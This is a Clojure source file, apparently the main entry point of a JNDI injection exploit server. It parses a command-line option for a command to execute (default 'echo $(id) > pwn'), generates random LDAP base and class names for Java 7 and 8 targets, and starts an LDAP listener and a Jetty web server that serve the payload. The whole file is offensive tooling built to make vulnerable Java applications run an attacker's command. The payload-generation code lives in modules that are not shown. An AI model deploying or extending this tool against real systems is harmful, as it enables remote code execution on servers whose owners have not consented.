(ns jndi-injector-clj.core
  (:require [ring.adapter.jetty :as jetty]
            [jndi-injector-clj.ldap :as ldap]
            [jndi-injector-clj.server :as server]
            [clojure.tools.cli :refer [parse-opts]])
  (:gen-class))

(def charset
  (->> (concat (range 48 58) (range 97 123))
       (map #(char %))))

(defn pick-char []
  (->> (count charset)
       (rand-int)
       (nth charset)))

(defn gen-str []
  (loop [index 6 string ""]
    (if (zero? index)
      string
      (recur (dec index) (str string (pick-char))))))

(defn gen-conf [options]
  {:port    (:port options)
   :command (:command options)
   :java7 {:ldap-base (gen-str) :class-name (gen-str)}
   :java8 {:ldap-base (gen-str) :class-name (gen-str)}})

(def cli-options
  [["-c" "--command COMMAND" "command to execute"
    :default "echo $(id) > pwn"]
   ["-p" "--port PORT" "webserver port"
    :default 3000
    :parse-fn #(Integer/parseInt %)
    :validate [#(< 0 % 0x10000) "Must be a number between 0 and 65536"]]
   ["-h" "--help"]])

(defn -main [& args]
  (let [options (:options (parse-opts args cli-options))
        port (:port options)
        app-conf (gen-conf options)
        _ (println app-conf)
        handler (server/gen-handler app-conf)]
    (.start (Thread. (fn [] (ldap/start app-conf))))
    (jetty/run-jetty handler {:port port})))
